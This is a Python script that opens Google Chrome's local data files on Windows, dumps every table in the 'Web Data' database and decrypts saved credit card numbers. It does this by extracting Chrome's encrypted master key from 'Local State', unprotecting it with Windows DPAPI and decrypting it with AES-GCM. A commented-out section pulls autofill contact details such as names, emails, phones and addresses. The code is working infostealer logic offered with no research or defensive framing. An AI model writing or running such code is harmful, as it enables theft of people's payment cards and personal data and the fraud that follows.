import os
import json
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES

db_top_sites = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/Default/Top Sites")

#db = db_top_sites
db = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/Default/Web Data")
        
def exec_query(query):
    try:
        connection = sqlite3.connect(db)
        cursor = connection.cursor()
        cursor.execute(query)
        data = cursor.fetchall()
        connection.close()
        return data
    except:
        return None


query = "SELECT * FROM sqlite_master WHERE type = 'table'; "
data = exec_query(query=query)
for line in data:
    table_name = line[1]
    subquery = "SELECT * FROM "+table_name
    print(line)
    table_data = exec_query(query=subquery)
    if table_data:
        for line in table_data:
            print(line)
    print("-"*50)

'''

query = "SELECT * FROM contact_info"
connection = sqlite3.connect(db)
cursor = connection.cursor()
cursor.execute(query)
response = []
for line in cursor.fetchall():
    response.append(line)
for line in response:
    guid = str(line[0])
    print(guid)
    #date_modified = date_from_webkit(line[2])
    query = "SELECT value FROM contact_info_type_tokens WHERE guid='"+guid+"';"
    cursor.execute(query)
    data = cursor.fetchall()
    name = data[4]
    email = data[5]
    phone = data[6]
    town_city = data[8]
    state = data[9]
    pin = data[10]
    country_region = data[11]
    org = data[12]
    street_addr = data[13]
    print(f"{name=}, {email=}")
'''


def get_chrome_pass_master_key():
    db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Local State')
    f_obj = open(db,'rb')
    data = f_obj.read()
    f_obj.close()
    
    temp = json.loads(data.decode())    
    protected_enc_key = base64.b64decode(temp['os_crypt']['encrypted_key'])
    protected_enc_key = protected_enc_key[5:]
    unprotected_enc_key = win32crypt.CryptUnprotectData(protected_enc_key)
    unprotected_enc_key = unprotected_enc_key[1]
    return unprotected_enc_key

query = "SELECT * FROM credit_cards;"
connection = sqlite3.connect(db)
cursor = connection.cursor()
cursor.execute(query)
for line in cursor.fetchall():
    card_number_blob =  line[4]
    key = get_chrome_pass_master_key()
    iv = card_number_blob[3:15]
    enc = card_number_blob[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    print("CREDIT CARD NUMBER")
    print(cipher.decrypt(enc[:-16]).decode('utf-8'))

connection.close()





